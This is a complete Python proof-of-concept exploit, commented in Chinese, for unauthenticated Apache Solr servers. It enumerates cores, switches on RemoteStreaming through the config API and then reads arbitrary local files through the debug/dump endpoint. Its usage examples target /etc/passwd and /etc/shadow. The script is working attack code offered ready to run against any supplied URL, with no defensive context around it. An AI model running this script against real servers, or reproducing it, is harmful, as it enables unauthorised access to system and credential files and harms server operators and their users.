#!/usr/bin/env python3
"""
Apache Solr 未授权 RemoteStreaming 文件读取 PoC
用法:
  python solr_file_read.py <目标URL> [文件路径]
示例:
  python solr_file_read.py http://192.168.1.100:8983 /etc/passwd
  python solr_file_read.py http://192.168.1.100:8983 /etc/shadow
"""

import requests
import sys
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SolrFileRead:
    def __init__(self, base_url, file_path="/etc/passwd"):
        self.base = base_url.rstrip('/')
        self.file_path = file_path
        self.session = requests.Session()
        self.session.verify = False

    def get_cores(self):
        """获取所有核心名称，返回列表"""
        url = f"{self.base}/solr/admin/cores?indexInfo=false&wt=json"
        try:
            resp = self.session.get(url, timeout=10)
            data = resp.json()
            cores = list(data.get("status", {}).keys())
            if cores:
                print(f"[+] 发现核心: {cores}")
                return cores
            else:
                print("[-] 未找到任何核心")
                return []
        except Exception as e:
            print(f"[-] 获取核心失败: {e}")
            return []

    def enable_remote_streaming(self, core):
        """启用 RemoteStreaming"""
        url = f"{self.base}/solr/{core}/config"
        payload = {
            "set-property": {
                "requestDispatcher.requestParsers.enableRemoteStreaming": True
            }
        }
        headers = {"Content-Type": "application/json"}
        try:
            resp = self.session.post(url, json=payload, headers=headers, timeout=10)
            if resp.status_code == 200:
                print(f"[+] 成功为核心 '{core}' 启用 RemoteStreaming")
                return True
            else:
                print(f"[-] 启用失败，状态码: {resp.status_code}")
                return False
        except Exception as e:
            print(f"[-] 请求异常: {e}")
            return False

    def read_file(self, core):
        """通过 stream.url 读取文件"""
        url = f"{self.base}/solr/{core}/debug/dump"
        params = {
            "param": "ContentStreams",
            "stream.url": f"file://{self.file_path}"
        }
        try:
            resp = self.session.get(url, params=params, timeout=15)
            if resp.status_code == 200 and len(resp.text) > 20:
                # 返回的 JSON 中可能包含文件内容
                try:
                    data = resp.json()
                    # 内容通常在 streams 字段中
                    streams = data.get("streams", [])
                    if streams:
                        print(f"[+] 成功读取文件: {self.file_path}")
                        print("-"*50)
                        print(streams[0].get("stream", ""))
                        print("-"*50)
                        return
                except json.JSONDecodeError:
                    pass
                print(f"[+] 返回内容(前1000字符):\n{resp.text[:1000]}")
            else:
                print(f"[-] 读取失败，状态码: {resp.status_code}")
                print(resp.text[:200])
        except Exception as e:
            print(f"[-] 读取异常: {e}")

    def run(self):
        print(f"[*] 目标 Solr: {self.base}")
        cores = self.get_cores()
        if not cores:
            print("[!] 尝试默认核心 'demo'")
            cores = ["demo"]
        target_core = cores[0]  # 使用第一个核心
        if self.enable_remote_streaming(target_core):
            self.read_file(target_core)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <Solr_URL> [文件路径]")
        print(f"示例: {sys.argv[0]} http://192.168.1.100:8983 /etc/passwd")
        sys.exit(1)

    target = sys.argv[1]
    file_to_read = sys.argv[2] if len(sys.argv) > 2 else "/etc/passwd"
    poc = SolrFileRead(target, file_to_read)
    poc.run()